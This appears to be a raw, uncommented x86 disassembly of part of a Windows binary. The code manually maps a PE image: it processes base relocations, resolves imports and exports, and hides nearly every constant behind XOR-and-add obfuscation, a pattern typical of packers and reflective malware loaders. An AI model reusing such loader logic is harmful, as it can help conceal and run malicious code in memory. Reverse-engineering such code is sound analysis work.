  41c2e4:	mov    DWORD PTR [edx],ecx
  41c2e6:	mov    ecx,DWORD PTR [ebp-0x4]
  41c2e9:	mov    DWORD PTR [ecx],eax
  41c2eb:	mov    eax,DWORD PTR [ebx+0x50]
  41c2ee:	mov    DWORD PTR [ebp-0x68],eax
  41c2f1:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2f4:	xor    eax,esi
  41c2f6:	add    eax,edi
  41c2f8:	mov    DWORD PTR [ebp-0x64],eax
  41c2fb:	lea    eax,[ebp-0x20]
  41c2fe:	mov    DWORD PTR [ebp-0x60],eax
  41c301:	lea    eax,[ebp-0x70]
  41c304:	push   eax
  41c305:	mov    eax,DWORD PTR [ebp+0x8]
  41c308:	xor    eax,esi
  41c30a:	add    eax,edi
  41c30c:	push   eax
  41c30d:	mov    eax,DWORD PTR [ebp+0x20]
  41c310:	add    eax,0xee
  41c315:	push   eax
  41c316:	mov    eax,DWORD PTR [ebp+0x20]
  41c319:	mov    eax,DWORD PTR [eax+0x198]
  41c31f:	mov    DWORD PTR [ebp-0x70],0x4
  41c326:	push   DWORD PTR [eax]
  41c328:	mov    eax,DWORD PTR [ebp+0x10]
  41c32b:	call   eax
  41c32d:	test   eax,eax
  41c32f:	je     0x41c354
  41c331:	and    DWORD PTR [ebp+0xc],0x0
  41c335:	cmp    DWORD PTR [ebx+0x50],0x0
  41c339:	jbe    0x41c354
  41c33b:	mov    eax,DWORD PTR [ebp+0x1c]
  41c33e:	mov    ecx,DWORD PTR [ebp-0x10]
  41c341:	sub    ecx,eax
  41c343:	mov    dl,BYTE PTR [ecx+eax*1]
  41c346:	inc    DWORD PTR [ebp+0xc]
  41c349:	mov    BYTE PTR [eax],dl
  41c34b:	mov    edx,DWORD PTR [ebp+0xc]
  41c34e:	inc    eax
  41c34f:	cmp    edx,DWORD PTR [ebx+0x50]
  41c352:	jb     0x41c343
  41c354:	mov    edx,DWORD PTR [ebp+0x1c]
  41c357:	mov    ecx,DWORD PTR [edx+0x3c]
  41c35a:	add    ecx,edx
  41c35c:	mov    eax,DWORD PTR [ecx+0xa0]
  41c362:	mov    ebx,DWORD PTR [ecx+0x28]
  41c365:	add    eax,edx
  41c367:	sub    edx,DWORD PTR [ebp-0x10]
  41c36a:	add    ebx,DWORD PTR [ebp+0x1c]
  41c36d:	mov    DWORD PTR [ebp+0xc],edx
  41c370:	mov    DWORD PTR [ebp-0x2c],ecx
  41c373:	mov    DWORD PTR [ebp-0x14],ebx
  41c376:	mov    DWORD PTR [ebp-0x8],0x0
  41c37d:	jmp    0x41c3f9
  41c37f:	add    edx,0xfffffff8
  41c382:	shr    edx,1
  41c384:	mov    DWORD PTR [ebp-0x18],edx
  41c387:	je     0x41c3e5
  41c389:	lea    edx,[eax+0x8]
  41c38c:	mov    DWORD PTR [ebp-0x4],edx
  41c38f:	mov    edx,DWORD PTR [ebp-0x18]
  41c392:	mov    DWORD PTR [ebp-0x18],edx
  41c395:	mov    edx,DWORD PTR [ebp-0x4]
  41c398:	movzx  edx,WORD PTR [edx]
  41c39b:	mov    DWORD PTR [ebp-0x24],edx
  41c39e:	and    edx,0xfff
  41c3a4:	mov    DWORD PTR [ebp-0x28],edx
  41c3a7:	mov    edx,DWORD PTR [ebp-0x24]
  41c3aa:	shr    edx,0xc
  41c3ad:	add    edx,0xffcd8d20
  41c3b3:	xor    edx,esi
  41c3b5:	cmp    edx,0xf89c85ba
  41c3bb:	jne    0x41c3dc
  41c3bd:	mov    edx,DWORD PTR [ebp-0x28]
  41c3c0:	add    edx,DWORD PTR [ebp+0x1c]
  41c3c3:	mov    ebx,DWORD PTR [eax]
  41c3c5:	cmp    DWORD PTR [ebx+edx*1],0x0
  41c3c9:	je     0x41c3d9
  41c3cb:	mov    ecx,DWORD PTR [ebp+0xc]
  41c3ce:	add    ecx,DWORD PTR [ebx+edx*1]
  41c3d1:	mov    ebx,DWORD PTR [eax]
  41c3d3:	mov    DWORD PTR [edx+ebx*1],ecx
  41c3d6:	mov    ecx,DWORD PTR [ebp-0x2c]
  41c3d9:	mov    ebx,DWORD PTR [ebp-0x14]
  41c3dc:	add    DWORD PTR [ebp-0x4],0x2
  41c3e0:	dec    DWORD PTR [ebp-0x18]
  41c3e3:	jne    0x41c395
  41c3e5:	mov    edx,DWORD PTR [ebp-0xc]
  41c3e8:	add    DWORD PTR [ebp-0x8],edx
  41c3eb:	mov    edx,DWORD PTR [ebp-0x8]
  41c3ee:	cmp    edx,DWORD PTR [ecx+0xa4]
  41c3f4:	jae    0x41c407
  41c3f6:	add    eax,DWORD PTR [ebp-0xc]
  41c3f9:	mov    edx,DWORD PTR [eax+0x4]
  41c3fc:	mov    DWORD PTR [ebp-0xc],edx
  41c3ff:	test   edx,edx
  41c401:	jne    0x41c37f
  41c407:	mov    eax,DWORD PTR [ebp-0x10]
  41c40a:	mov    DWORD PTR [ebp-0x6c],eax
  41c40d:	mov    DWORD PTR [ebp-0x70],0x4
  41c414:	mov    eax,DWORD PTR [ecx+0x50]
  41c417:	mov    DWORD PTR [ebp-0x68],eax
  41c41a:	mov    eax,DWORD PTR [ebp-0x1c]
  41c41d:	xor    eax,esi
  41c41f:	add    eax,edi
  41c421:	mov    DWORD PTR [ebp-0x64],eax
  41c424:	lea    eax,[ebp-0x20]
  41c427:	mov    DWORD PTR [ebp-0x60],eax
  41c42a:	lea    eax,[ebp-0x70]
  41c42d:	push   eax
  41c42e:	mov    eax,DWORD PTR [ebp+0x8]
  41c431:	xor    eax,esi
  41c433:	add    eax,edi
  41c435:	push   eax
  41c436:	mov    eax,DWORD PTR [ebp+0x20]
  41c439:	add    eax,0xee
  41c43e:	push   eax
  41c43f:	mov    eax,DWORD PTR [ebp+0x20]
  41c442:	mov    eax,DWORD PTR [eax+0x198]
  41c448:	push   DWORD PTR [eax]
  41c44a:	mov    eax,DWORD PTR [ebp+0x10]
  41c44d:	call   eax
  41c44f:	mov    eax,DWORD PTR [ebp+0x20]
  41c452:	mov    eax,DWORD PTR [eax+0x180]
  41c458:	add    eax,DWORD PTR [ebp+0xc]
  41c45b:	mov    ecx,DWORD PTR [ebp+0xc]
  41c45e:	push   DWORD PTR [ebp+0x18]
  41c461:	mov    DWORD PTR [eax],ecx
  41c463:	push   DWORD PTR [ebp+0x14]
  41c466:	push   DWORD PTR [ebp+0x1c]
  41c469:	call   ebx
  41c46b:	mov    ecx,DWORD PTR [ebp+0xc]
  41c46e:	add    ecx,DWORD PTR [ebp+0x20]
  41c471:	lea    eax,[ebp+0x4]
  41c474:	mov    DWORD PTR [ebp+0x20],ecx
  41c477:	mov    ecx,DWORD PTR [ebp+0x20]
  41c47a:	mov    ecx,DWORD PTR [ebp+0x20]
  41c47d:	mov    edx,DWORD PTR [ecx+0x190]
  41c483:	mov    ecx,DWORD PTR [ebp+0x20]
  41c486:	mov    ecx,DWORD PTR [ecx+0x18c]
  41c48c:	mov    esi,DWORD PTR [ecx]
  41c48e:	cmp    DWORD PTR [eax],esi
  41c490:	jb     0x41c4b1
  41c492:	mov    esi,DWORD PTR [edx]
  41c494:	mov    edi,DWORD PTR [edx]
  41c496:	mov    esi,DWORD PTR [esi+0x3c]
  41c499:	lea    esi,[edi+esi*1+0x50]
  41c49d:	mov    edi,DWORD PTR [ecx]
  41c49f:	add    edi,DWORD PTR [esi]
  41c4a1:	cmp    DWORD PTR [eax],edi
  41c4a3:	jae    0x41c4b1
  41c4a5:	mov    esi,DWORD PTR [ecx]
  41c4a7:	mov    ecx,DWORD PTR [eax]
  41c4a9:	mov    edx,DWORD PTR [edx]
  41c4ab:	sub    ecx,esi
  41c4ad:	add    edx,ecx
  41c4af:	mov    DWORD PTR [eax],edx
  41c4b1:	mov    eax,DWORD PTR [ebp+0xc]
  41c4b4:	jmp    0x41c4b8
  41c4b6:	xor    eax,eax
  41c4b8:	pop    edi
  41c4b9:	pop    esi
  41c4ba:	pop    ebx
  41c4bb:	leave  
  41c4bc:	ret    0x1c
  41c4bf:	push   ebp
  41c4c0:	mov    ebp,esp
  41c4c2:	sub    esp,0x1c
  41c4c5:	push   esi
  41c4c6:	mov    esi,eax
  41c4c8:	mov    eax,DWORD PTR [ecx+0x190]
  41c4ce:	cmp    DWORD PTR [eax],0x0
  41c4d1:	je     0x41c5e1
  41c4d7:	test   edx,edx
  41c4d9:	je     0x41c5e1
  41c4df:	test   esi,esi
  41c4e1:	je     0x41c5e1
  41c4e7:	mov    eax,DWORD PTR [esi+0x88]
  41c4ed:	test   eax,eax
  41c4ef:	je     0x41c5dc
  41c4f5:	cmp    DWORD PTR [esi+0x8c],0x10
  41c4fc:	je     0x41c5dc
  41c502:	cmp    DWORD PTR [esi+0x34],edx
  41c505:	je     0x41c5dc
  41c50b:	mov    esi,DWORD PTR [ecx+0x18c]
  41c511:	and    DWORD PTR [ebp-0x10],0x0
  41c515:	mov    ecx,edx
  41c517:	sub    ecx,DWORD PTR [esi]
  41c519:	add    eax,edx
  41c51b:	movzx  edx,WORD PTR [eax+0xc]
  41c51f:	mov    DWORD PTR [ebp-0x1c],ecx
  41c522:	movzx  ecx,WORD PTR [eax+0xe]
  41c526:	add    ecx,edx
  41c528:	je     0x41c5dc
  41c52e:	lea    ecx,[eax+0x14]
  41c531:	push   ebx
  41c532:	mov    DWORD PTR [ebp-0x18],ecx
  41c535:	mov    esi,0x7fffffff
  41c53a:	push   edi
  41c53b:	test   DWORD PTR [ecx],esi
  41c53d:	je     0x41c5be
  41c53f:	mov    edx,DWORD PTR [ecx]
  41c541:	and    DWORD PTR [ebp-0xc],0x0
  41c545:	and    edx,esi
  41c547:	add    edx,eax
  41c549:	movzx  edi,WORD PTR [edx+0xe]
  41c54d:	movzx  ebx,WORD PTR [edx+0xc]
  41c551:	add    edi,ebx
  41c553:	je     0x41c5be
  41c555:	lea    ecx,[edx+0x14]
  41c558:	mov    DWORD PTR [ebp-0x14],ecx
  41c55b:	test   DWORD PTR [ecx],esi
  41c55d:	je     0x41c5a0
  41c55f:	mov    ecx,DWORD PTR [ecx]
  41c561:	and    DWORD PTR [ebp-0x8],0x0
  41c565:	and    ecx,esi
  41c567:	add    ecx,eax
  41c569:	movzx  edi,WORD PTR [ecx+0xe]
  41c56d:	movzx  ebx,WORD PTR [ecx+0xc]
  41c571:	add    edi,ebx
  41c573:	je     0x41c5a0
  41c575:	lea    edi,[ecx+0x14]
  41c578:	mov    DWORD PTR [ebp-0x4],edi
  41c57b:	mov    edi,DWORD PTR [ebp-0x4]
  41c57e:	mov    edi,DWORD PTR [edi]
  41c580:	test   edi,edi
  41c582:	je     0x41c58a
  41c584:	mov    ebx,DWORD PTR [ebp-0x1c]
  41c587:	add    DWORD PTR [edi+eax*1],ebx
  41c58a:	movzx  edi,WORD PTR [ecx+0xe]
  41c58e:	movzx  ebx,WORD PTR [ecx+0xc]
  41c592:	inc    DWORD PTR [ebp-0x8]
  41c595:	add    DWORD PTR [ebp-0x4],0x8
  41c599:	add    edi,ebx
  41c59b:	cmp    DWORD PTR [ebp-0x8],edi
  41c59e:	jb     0x41c57b
  41c5a0:	movzx  edi,WORD PTR [edx+0xe]
  41c5a4:	movzx  ebx,WORD PTR [edx+0xc]
  41c5a8:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ab:	inc    DWORD PTR [ebp-0xc]
  41c5ae:	add    ecx,0x8
  41c5b1:	add    edi,ebx
  41c5b3:	mov    DWORD PTR [ebp-0x14],ecx
  41c5b6:	cmp    DWORD PTR [ebp-0xc],edi
  41c5b9:	jb     0x41c55b
  41c5bb:	mov    ecx,DWORD PTR [ebp-0x18]
  41c5be:	movzx  edx,WORD PTR [eax+0xe]
  41c5c2:	movzx  edi,WORD PTR [eax+0xc]
  41c5c6:	inc    DWORD PTR [ebp-0x10]
  41c5c9:	add    ecx,0x8
  41c5cc:	add    edx,edi
  41c5ce:	mov    DWORD PTR [ebp-0x18],ecx
  41c5d1:	cmp    DWORD PTR [ebp-0x10],edx
  41c5d4:	jb     0x41c53b
  41c5da:	pop    edi
  41c5db:	pop    ebx
  41c5dc:	xor    eax,eax
  41c5de:	inc    eax
  41c5df:	jmp    0x41c5e3
  41c5e1:	xor    eax,eax
  41c5e3:	pop    esi
  41c5e4:	leave  
  41c5e5:	ret    
  41c5e6:	push   ebp
  41c5e7:	mov    ebp,esp
  41c5e9:	mov    ecx,DWORD PTR [ecx+0x190]
  41c5ef:	mov    eax,DWORD PTR [ebp+0xc]
  41c5f2:	sub    esp,0x10
  41c5f5:	push   ebx
  41c5f6:	xor    ebx,ebx
  41c5f8:	push   esi
  41c5f9:	push   edi
  41c5fa:	cmp    DWORD PTR [ecx],ebx
  41c5fc:	je     0x41c684
  41c602:	cmp    eax,ebx
  41c604:	je     0x41c684
  41c606:	cmp    DWORD PTR [eax+0x78],ebx
  41c609:	jne    0x41c610
  41c60b:	xor    eax,eax
  41c60d:	inc    eax
  41c60e:	jmp    0x41c686
  41c610:	mov    eax,DWORD PTR [eax+0x78]
  41c613:	add    eax,DWORD PTR [ebp+0x8]
  41c616:	mov    ecx,DWORD PTR [eax+0x1c]
  41c619:	mov    edx,DWORD PTR [eax+0x24]
  41c61c:	mov    esi,DWORD PTR [eax+0x14]
  41c61f:	mov    edi,DWORD PTR [eax+0x18]
  41c622:	add    ecx,DWORD PTR [ebp+0x8]
  41c625:	add    edx,DWORD PTR [ebp+0x8]
  41c628:	mov    DWORD PTR [ebp-0x4],esi
  41c62b:	cmp    esi,edi
  41c62d:	ja     0x41c632
  41c62f:	mov    DWORD PTR [ebp-0x4],edi
  41c632:	mov    DWORD PTR [ebp-0x8],ebx
  41c635:	cmp    DWORD PTR [ebp-0x4],ebx
  41c638:	jbe    0x41c60b
  41c63a:	cmp    ebx,DWORD PTR [eax+0x14]
  41c63d:	jae    0x41c645
  41c63f:	movzx  esi,WORD PTR [edx+ebx*2]
  41c643:	jmp    0x41c647
  41c645:	mov    esi,ebx
  41c647:	lea    esi,[ecx+esi*4]
  41c64a:	mov    edi,DWORD PTR [esi]
  41c64c:	test   edi,edi
  41c64e:	je     0x41c679
  41c650:	add    edi,DWORD PTR [ebp+0x8]
  41c653:	mov    DWORD PTR [ebp-0x10],edi
  41c656:	cmp    edi,eax
  41c658:	jbe    0x41c66a
  41c65a:	mov    ebx,DWORD PTR [ebp+0xc]
  41c65d:	mov    ebx,DWORD PTR [ebx+0x7c]
  41c660:	add    ebx,eax
  41c662:	cmp    edi,ebx
  41c664:	jae    0x41c66a
  41c666:	mov    esi,DWORD PTR [esi]
  41c668:	jmp    0x41c672
  41c66a:	sub    edi,DWORD PTR [ebp+0x8]
  41c66d:	mov    DWORD PTR [esi],edi
  41c66f:	mov    esi,DWORD PTR [ebp-0x10]
  41c672:	test   esi,esi
  41c674:	je     0x41c684
  41c676:	mov    ebx,DWORD PTR [ebp-0x8]
  41c679:	inc    ebx
  41c67a:	mov    DWORD PTR [ebp-0x8],ebx
  41c67d:	cmp    ebx,DWORD PTR [ebp-0x4]
  41c680:	jb     0x41c63a
  41c682:	jmp    0x41c60b
  41c684:	xor    eax,eax
  41c686:	pop    edi
  41c687:	pop    esi
  41c688:	pop    ebx
  41c689:	leave  
  41c68a:	ret    0x8
  41c68d:	push   ebp
  41c68e:	mov    ebp,esp
  41c690:	sub    esp,0x2c
  41c693:	mov    edx,0xf89c85b9
  41c698:	mov    DWORD PTR [ebp-0x4],edx
  41c69b:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41c6a2:	mov    eax,DWORD PTR [ebp-0x4]
  41c6a5:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6a8:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6ab:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6ae:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6b1:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6b4:	push   ebx
  41c6b5:	mov    ebx,DWORD PTR [ebp+0x10]
  41c6b8:	push   esi
  41c6b9:	mov    esi,0x7510899
  41c6be:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41c6c5:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6c8:	mov    ebx,DWORD PTR [ebx+0x190]
  41c6ce:	push   edi
  41c6cf:	mov    edi,0x3272e0
  41c6d4:	xor    ecx,esi
  41c6d6:	xor    eax,esi
  41c6d8:	add    eax,edi
  41c6da:	add    ecx,edi
  41c6dc:	mov    DWORD PTR [ebp-0x18],eax
  41c6df:	cmp    ecx,DWORD PTR [ebx]
  41c6e1:	je     0x41c962
  41c6e7:	mov    ebx,DWORD PTR [ebp-0x4]
  41c6ea:	mov    ecx,DWORD PTR [ebp+0xc]
  41c6ed:	xor    ebx,esi
  41c6ef:	add    ebx,edi
  41c6f1:	cmp    ebx,ecx
  41c6f3:	je     0x41c962
  41c6f9:	mov    ebx,DWORD PTR [ebp-0x4]
  41c6fc:	mov    ecx,DWORD PTR [ecx+0x80]
  41c702:	xor    ebx,esi
  41c704:	add    ebx,edi
  41c706:	cmp    ecx,ebx
  41c708:	je     0x41c95d
  41c70e:	add    ecx,DWORD PTR [ebp+0x8]
  41c711:	mov    DWORD PTR [ebp-0x2c],ecx
  41c714:	mov    ebx,edx
  41c716:	xor    ebx,esi
  41c718:	add    ebx,edi
  41c71a:	mov    DWORD PTR [ebp-0x10],ebx
  41c71d:	mov    ebx,DWORD PTR [ebp-0x10]
  41c720:	cmp    ebx,edx
  41c722:	je     0x41c736
  41c724:	mov    edx,DWORD PTR [ebp-0x10]
  41c727:	mov    ebx,DWORD PTR [ebp-0x4]
  41c72a:	imul   edx,edx,0x14
  41c72d:	xor    ebx,esi
  41c72f:	add    ebx,edi
  41c731:	cmp    DWORD PTR [edx+ecx*1],ebx
  41c734:	jne    0x41c74d
  41c736:	mov    edx,DWORD PTR [ebp-0x10]
  41c739:	mov    ebx,DWORD PTR [ebp-0x4]
  41c73c:	imul   edx,edx,0x14
  41c73f:	xor    ebx,esi
  41c741:	add    ebx,edi
  41c743:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41c747:	je     0x41c94f
  41c74d:	mov    eax,DWORD PTR [ebp-0x4]
  41c750:	mov    ebx,DWORD PTR [ebp-0x4]
  41c753:	mov    eax,DWORD PTR [ebp-0x10]
  41c756:	imul   eax,eax,0x14
  41c759:	add    eax,ecx
  41c75b:	mov    ecx,DWORD PTR [eax+0x10]
  41c75e:	add    ecx,DWORD PTR [ebp+0x8]
  41c761:	xor    ebx,esi
  41c763:	mov    DWORD PTR [ebp-0x1c],ecx
  41c766:	mov    ecx,DWORD PTR [ebp-0x4]
  41c769:	mov    edx,DWORD PTR [ebp-0x4]
  41c76c:	xor    ecx,esi
  41c76e:	add    ecx,edi
  41c770:	xor    edx,esi
  41c772:	mov    DWORD PTR [ebp-0x24],ecx
  41c775:	mov    ecx,DWORD PTR [eax]
  41c777:	add    edx,edi
  41c779:	add    ebx,edi
  41c77b:	cmp    ecx,edx
  41c77d:	je     0x41c785
  41c77f:	add    ecx,DWORD PTR [ebp+0x8]
  41c782:	mov    DWORD PTR [ebp-0x24],ecx
  41c785:	mov    ecx,DWORD PTR [ebp-0x4]
  41c788:	xor    ecx,esi
  41c78a:	add    ecx,DWORD PTR [eax+0xc]
  41c78d:	mov    eax,DWORD PTR [ebp+0x8]
  41c790:	lea    eax,[ecx+eax*1+0x3272e0]
  41c797:	mov    DWORD PTR [ebp+0xc],eax
  41c79a:	mov    DWORD PTR [ebp-0x28],0xf89c85bc
  41c7a1:	mov    eax,DWORD PTR [ebp+0x10]
  41c7a4:	push   DWORD PTR [ebp+0xc]
  41c7a7:	mov    eax,DWORD PTR [eax+0x1d8]
  41c7ad:	call   DWORD PTR [eax]
  41c7af:	mov    ecx,DWORD PTR [ebp-0x4]
  41c7b2:	xor    ecx,esi
  41c7b4:	add    ecx,edi
  41c7b6:	mov    DWORD PTR [ebp-0xc],eax
  41c7b9:	cmp    ecx,eax
  41c7bb:	jne    0x41c7cf
  41c7bd:	mov    eax,DWORD PTR [ebp+0x10]
  41c7c0:	push   DWORD PTR [ebp+0xc]
  41c7c3:	mov    eax,DWORD PTR [eax+0x1d8]
  41c7c9:	call   DWORD PTR [eax+0xc]
  41c7cc:	mov    DWORD PTR [ebp-0xc],eax
  41c7cf:	mov    DWORD PTR [ebp-0x20],0x7f661b00
  41c7d6:	mov    DWORD PTR [ebp-0x20],0xf89c9990
  41c7dd:	mov    eax,DWORD PTR [ebp-0x4]
  41c7e0:	xor    eax,esi
  41c7e2:	add    eax,edi
  41c7e4:	cmp    eax,DWORD PTR [ebp-0xc]
  41c7e7:	jne    0x41c80c
  41c7e9:	mov    eax,DWORD PTR [ebp-0x8]
  41c7ec:	mov    ecx,DWORD PTR [ebp-0x20]
  41c7ef:	xor    eax,esi
  41c7f1:	xor    ecx,esi
  41c7f3:	lea    ebx,[ebx+eax*1+0x3272e0]
  41c7fa:	mov    eax,DWORD PTR [ebp+0x10]
  41c7fd:	mov    eax,DWORD PTR [eax+0x1d8]
  41c803:	add    ecx,edi
  41c805:	imul   ecx,ebx
  41c808:	push   ecx
  41c809:	call   DWORD PTR [eax+0x24]
  41c80c:	mov    eax,DWORD PTR [ebp-0x4]
  41c80f:	xor    eax,esi
  41c811:	add    eax,edi
  41c813:	cmp    eax,DWORD PTR [ebp-0xc]
  41c816:	jne    0x41c827
  41c818:	mov    eax,DWORD PTR [ebp-0x28]
  41c81b:	xor    eax,esi
  41c81d:	add    eax,edi
  41c81f:	cmp    ebx,eax
  41c821:	jbe    0x41c7a1
  41c827:	mov    eax,DWORD PTR [ebp-0x4]
  41c82a:	xor    eax,esi
  41c82c:	add    eax,edi
  41c82e:	cmp    eax,DWORD PTR [ebp-0xc]
  41c831:	jne    0x41c84a
  41c833:	mov    eax,DWORD PTR [ebp-0x8]
  41c836:	mov    ecx,DWORD PTR [ebp-0x18]
  41c839:	xor    eax,esi
  41c83b:	lea    eax,[ecx+eax*1+0x3272e0]
  41c842:	mov    DWORD PTR [ebp-0x18],eax
  41c845:	jmp    0x41c939
  41c84a:	mov    DWORD PTR [ebp-0x14],0x1121b01
  41c851:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41c858:	mov    ebx,DWORD PTR [ebp-0x4]
  41c85b:	xor    ebx,esi
  41c85d:	add    ebx,edi
  41c85f:	jmp    0x41c926
  41c864:	mov    eax,DWORD PTR [ebp-0x4]
  41c867:	xor    eax,esi
  41c869:	add    eax,edi
  41c86b:	mov    DWORD PTR [ebp-0x14],eax
  41c86e:	mov    eax,DWORD PTR [ebp-0x4]
  41c871:	xor    eax,esi
  41c873:	add    eax,edi
  41c875:	mov    DWORD PTR [ebp+0xc],eax
  41c878:	mov    ecx,DWORD PTR [ebp-0x4]
  41c87b:	mov    eax,DWORD PTR [ebp-0x24]
  41c87e:	xor    ecx,esi
  41c880:	add    ecx,edi
  41c882:	cmp    ecx,eax
  41c884:	je     0x41c88c
  41c886:	mov    eax,DWORD PTR [eax+ebx*4]
  41c889:	mov    DWORD PTR [ebp-0x14],eax
  41c88c:	mov    eax,DWORD PTR [ebp-0x1c]
  41c88f:	mov    eax,DWORD PTR [eax+ebx*4]
  41c892:	mov    DWORD PTR [ebp+0xc],eax
  41c895:	mov    eax,DWORD PTR [ebp-0x4]
  41c898:	mov    ecx,DWORD PTR [ebp-0x14]
  41c89b:	xor    eax,esi
  41c89d:	add    eax,edi
  41c89f:	cmp    eax,ecx
  41c8a1:	je     0x41c8cc
  41c8a3:	mov    eax,DWORD PTR [ebp-0x4]
  41c8a6:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8a9:	xor    eax,esi
  41c8ab:	add    eax,edi
  41c8ad:	shr    ecx,0x1f
  41c8b0:	cmp    eax,ecx
  41c8b2:	je     0x41c8cc
  41c8b4:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8b7:	mov    eax,DWORD PTR [ebp+0x10]
  41c8ba:	mov    eax,DWORD PTR [eax+0x1d8]
  41c8c0:	movzx  ecx,cx
  41c8c3:	push   ecx
  41c8c4:	push   DWORD PTR [ebp-0xc]
  41c8c7:	call   DWORD PTR [eax+0x8]
  41c8ca:	jmp    0x41c8e5
  41c8cc:	mov    eax,DWORD PTR [ebp+0xc]
  41c8cf:	add    eax,DWORD PTR [ebp+0x8]
  41c8d2:	mov    ecx,DWORD PTR [ebp+0x10]
  41c8d5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41c8db:	add    eax,0x2
  41c8de:	push   eax
  41c8df:	push   DWORD PTR [ebp-0xc]
  41c8e2:	call   DWORD PTR [ecx+0x8]
  41c8e5:	mov    DWORD PTR [ebp+0xc],eax
  41c8e8:	mov    eax,DWORD PTR [ebp-0x4]
  41c8eb:	mov    ecx,DWORD PTR [ebp+0xc]
  41c8ee:	xor    eax,esi
  41c8f0:	add    eax,edi
  41c8f2:	cmp    eax,ecx
  41c8f4:	mov    eax,DWORD PTR [ebp-0x8]
  41c8f7:	jne    0x41c90a
  41c8f9:	mov    ecx,DWORD PTR [ebp-0x18]
  41c8fc:	xor    eax,esi
  41c8fe:	lea    eax,[ecx+eax*1+0x3272e0]
  41c905:	mov    DWORD PTR [ebp-0x18],eax
  41c908:	jmp    0x41c91a
  41c90a:	mov    ecx,DWORD PTR [ebp+0xc]
  41c90d:	xor    eax,esi
  41c90f:	add    eax,edi
  41c911:	imul   eax,ecx
  41c914:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c917:	mov    DWORD PTR [ecx+ebx*4],eax
  41c91a:	mov    eax,DWORD PTR [ebp-0x8]
  41c91d:	xor    eax,esi
  41c91f:	lea    ebx,[ebx+eax*1+0x3272e0]
  41c926:	mov    eax,DWORD PTR [ebp-0x4]
  41c929:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c92c:	xor    eax,esi
  41c92e:	add    eax,edi
  41c930:	cmp    DWORD PTR [ecx+ebx*4],eax
  41c933:	jne    0x41c864
  41c939:	mov    edx,DWORD PTR [ebp-0x10]
  41c93c:	mov    eax,DWORD PTR [ebp-0x18]
  41c93f:	mov    ecx,DWORD PTR [ebp-0x2c]
  41c942:	sub    edx,0x3272df
  41c948:	xor    edx,esi
  41c94a:	jmp    0x41c714
  41c94f:	mov    ecx,DWORD PTR [ebp-0x4]
  41c952:	xor    ecx,esi
  41c954:	add    ecx,edi
  41c956:	cmp    eax,ecx
  41c958:	mov    eax,DWORD PTR [ebp-0x4]
  41c95b:	jne    0x41c965
  41c95d:	mov    eax,DWORD PTR [ebp-0x8]
  41c960:	jmp    0x41c965
  41c962:	mov    eax,DWORD PTR [ebp-0x4]
  41c965:	xor    eax,esi
  41c967:	add    eax,edi
  41c969:	pop    edi
  41c96a:	pop    esi
  41c96b:	pop    ebx
  41c96c:	leave  
  41c96d:	ret    0xc
  41c970:	push   ebp
  41c971:	mov    ebp,esp
  41c973:	sub    esp,0x28
  41c976:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41c97d:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41c984:	mov    eax,DWORD PTR [ebp+0xc]
  41c987:	mov    DWORD PTR [ebp+0xc],eax
  41c98a:	push   esi
  41c98b:	mov    eax,eax
  41c98d:	mov    eax,DWORD PTR [ebp-0x4]
  41c990:	mov    esi,DWORD PTR [ebp+0x8]
  41c993:	mov    ecx,0x7510899
  41c998:	xor    eax,ecx
  41c99a:	mov    edx,0x3272e0
  41c99f:	add    eax,edx
  41c9a1:	cmp    esi,eax
  41c9a3:	je     0x41caca
  41c9a9:	mov    eax,DWORD PTR [ebp+0x8]
  41c9ac:	mov    esi,DWORD PTR [ebp+0x8]
  41c9af:	add    esi,DWORD PTR [eax+0x3c]
  41c9b2:	push   edi
  41c9b3:	mov    DWORD PTR [ebp+0xc],esi
  41c9b6:	mov    DWORD PTR [ebp-0x1c],0xf89c85bc
  41c9bd:	mov    eax,DWORD PTR [ebp-0x1c]
  41c9c0:	mov    esi,DWORD PTR [ebp-0x4]
  41c9c3:	mov    edi,DWORD PTR [ebp+0xc]
  41c9c6:	xor    esi,ecx
  41c9c8:	xor    eax,ecx
  41c9ca:	add    esi,edx
  41c9cc:	cmp    DWORD PTR [edi+eax*8+0x1939778],esi
  41c9d3:	je     0x41cac4
  41c9d9:	mov    esi,DWORD PTR [ebp+0xc]
  41c9dc:	mov    eax,DWORD PTR [ebp+0x8]
  41c9df:	add    eax,DWORD PTR [esi+0xa0]
  41c9e5:	mov    esi,DWORD PTR [ebp+0x8]
  41c9e8:	mov    edi,DWORD PTR [ebp+0xc]
  41c9eb:	sub    esi,DWORD PTR [edi+0x34]
  41c9ee:	mov    edi,DWORD PTR [ebp-0x4]
  41c9f1:	xor    edi,ecx
  41c9f3:	add    edi,edx
  41c9f5:	mov    DWORD PTR [ebp-0x24],esi
  41c9f8:	cmp    esi,edi
  41c9fa:	je     0x41cac4
  41ca00:	mov    esi,DWORD PTR [ebp-0x4]
  41ca03:	xor    esi,ecx
  41ca05:	add    esi,edx
  41ca07:	mov    DWORD PTR [ebp-0x8],esi
  41ca0a:	push   ebx
  41ca0b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41ca12:	jmp    0x41caae
  41ca17:	mov    esi,DWORD PTR [ebp-0x4]
  41ca1a:	xor    esi,ecx
  41ca1c:	lea    edi,[ebx-0x8]
  41ca1f:	add    esi,edx
  41ca21:	shr    edi,1
  41ca23:	cmp    esi,edi
  41ca25:	jae    0x41ca94
  41ca27:	sub    edi,esi
  41ca29:	lea    ebx,[eax+esi*2+0x8]
  41ca2d:	mov    DWORD PTR [ebp-0x18],edi
  41ca30:	movzx  esi,WORD PTR [ebx]
  41ca33:	and    esi,0xfff
  41ca39:	mov    DWORD PTR [ebp-0x14],esi
